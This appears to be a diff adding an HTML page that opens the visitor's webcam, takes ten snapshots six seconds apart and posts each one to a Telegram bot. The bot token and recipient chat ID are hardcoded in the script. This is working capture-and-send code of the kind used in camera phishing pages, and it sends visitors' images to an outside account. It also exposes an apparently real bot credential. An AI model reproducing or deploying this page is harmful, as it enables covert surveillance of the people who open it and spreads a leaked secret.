@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Snapshot to Telegram</title>
+  <style>
+    body { font-family: Arial; text-align: center; background: #e8f4f8; }
+    video { width: 300px; border: 2px solid #555; margin: 10px; }
+    img { width: 80px; margin: 5px; border: 1px solid #333; }
+  </style>
+</head>
+<body>
+  <h2>1 Minute Snapshot (Auto-Send to Telegram)</h2>
+  <video id="video" autoplay muted></video>
+  <div id="snapshots"></div>
+
+  <script>
+    const video = document.getElementById('video');
+    const snapshotsDiv = document.getElementById('snapshots');
+    const BOT_TOKEN = '7826691763:AAEWBVInzCY7o7zGnHEZl7EoKkUMcF8rbOw';
+    const USER_ID = '8033576116';
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        let count = 0;
+
+        const interval = setInterval(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/jpeg');
+          const blob = dataURItoBlob(imageData);
+
+          sendPhotoToTelegram(blob);
+          showThumbnail(imageData);
+
+          count++;
+          if (count >= 10) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop());
+          }
+        }, 6000); // every 6 seconds
+      })
+      .catch(error => {
+        alert("Camera access denied or error: " + error.message);
+      });
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', USER_ID);
+      formData.append('photo', blob, 'snapshot.jpg');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => console.log('Sent to Telegram:', data))
+      .catch(err => console.error('Telegram send error:', err));
+    }
+
+    function showThumbnail(imgSrc) {
+      const img = document.createElement('img');
+      img.src = imgSrc;
+      snapshotsDiv.appendChild(img);
+    }
+  </script>
+</body>
+</html>
